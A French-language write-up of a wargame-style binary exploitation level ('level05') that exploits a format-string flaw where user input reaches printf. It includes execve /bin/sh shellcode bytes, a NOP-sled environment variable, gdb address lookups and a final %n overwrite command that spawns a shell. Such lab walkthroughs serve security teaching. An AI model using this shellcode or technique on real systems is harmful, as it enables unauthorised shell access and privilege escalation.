# Writeup

Lorsque nous arrivons au level5, nous constatons qu'il n'y a pas de protection
sur le binaire. Nous le lancons une premiere fois, et nous voyons qu'un input
est attentu sur l'entree standard.

![Capture d’écran 2020-10-07 à 04 51 47](https://user-images.githubusercontent.com/25014717/95283461-2d013780-085c-11eb-9337-dceea4c3989a.png)

Apres avoir lance le binaire sous gdb, nous constatons que le programme est
relativement simple: apres avoir lu notre sur l'entree standard dans un buffer
de 100 char, le programme inspecte chaque caractere, et si celui ci est
majuscule, effectue un XOR de 0x20, ce qui a pour consequence de le transformer
en minuscule.Apres cette operation, le buffer est directement envoye a printf,
ce qui nous ouvre la porte pour un exploit de format string.


![Capture d’écran 2020-10-07 à 04 52 54](https://user-images.githubusercontent.com/25014717/95283459-2c68a100-085c-11eb-9394-4f2313cf9eb2.png)

![Capture d’écran 2020-10-07 à 04 52 25](https://user-images.githubusercontent.com/25014717/95283460-2c68a100-085c-11eb-94b8-ae0cb0ca8af8.png)


Nous avons deux contraintes: la premiere est quele buffer etant modifie avec des
XOR, nous ne pouvons pas y placer notre shellcode. La seconde est que le main
quitte le programme via un exit, et non par un return. Avec notre format string,
nous pouvons ecrire a loisir dans la memoire. Nous avons donc deux options: soit
modifer l'appel a exit dans la global offset table, soit manipuler la valeur
qu'utilisera le printf pour retourner de son appel et revenir au main. Dans les
deux cas, nous ferrons passer notre shellcode par l'environnement.



Dans un premier temps, pour avoir le decalage d'adresse de le plus minime
possible, nous chargeons notre shellcode dans l'environnement avec un nopsled.

> echo -ne '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' > /tmp/shellcode.bin 
>
> export SLEDCODE=$(python -c 'print "\x90"*128')$(cat /tmp/shellcode.bin)

Nous determinons ensuite ou se situe notre chaine de caractere
dans la stack:

> 'print "aaaa " + "%08x " * 20' | ./level05

![Capture d’écran 2020-10-07 à 04 56 13](https://user-images.githubusercontent.com/25014717/95283457-2bd00a80-085c-11eb-9f63-62f2b896213f.png)



Notre adresse a ecrire se trouvera donc au 10eme element. Comme nous allons
ecrire une adresse, nombre assez eleve, nous choisisons d'ecrire en deux
fois. Nous utiliserons donc les positions 10 et 11, et passerons deux adresses
dans notre format string.

> '[Adresse Cible] + [Adresse cible + 2] + %[2 Premiers bytes - 8]x + "%10$n"
> \+ %[2 Derniers bytes - 2 Premiers bytes]x + "%11$n"

Pour recuperer l'adresse qui nous interesse, il nous suffit d'aller regarder le
retour de printf dans gdb

> (gdb) b *printf+50
> (gdb) x/a $esp

![Capture d’écran 2020-10-07 à 05 00 08](https://user-images.githubusercontent.com/25014717/95283450-296db080-085c-11eb-9db2-0c516ea163ab.png)

Nous recuperons notre adresse cible. Nous en profitons pour recuperer l'adresse
du milieu de notre sled:

> (gdb) x/12s *((char **) environ)

![Capture d’écran 2020-10-07 à 05 00 38](https://user-images.githubusercontent.com/25014717/95283451-2a9edd80-085c-11eb-9704-2ea3f375104b.png)


Le calcul a effectuer pour recuprer le millieu de notre nodsled est le suivant:

> & == ADRESSE
> [&SLEDCODE] + (([&VARIABLE SUIVANTE] - [&SLEDCODE]) / 2)

Nous prennons donc cette adresse, la separons en deux parties que nous calculons
selon la methode decrite plus haut.

Fort de tout ces elements, nous avons la commande finale:

> (python -c 'print "\xbc\xd5\xff\xff" + "\xbe\xd5\xff\xff" + "%55528x" + "%10$n" + "%9999x" + "%11$n"'; cat -) | ./level05

![Capture d’écran 2020-10-07 à 05 01 54](https://user-images.githubusercontent.com/25014717/95283456-2bd00a80-085c-11eb-9206-02cfb3bc133f.png)


![Capture d’écran 2020-10-07 à 05 02 07](https://user-images.githubusercontent.com/25014717/95283449-28d51a00-085c-11eb-95a7-f07523542d4f.png)
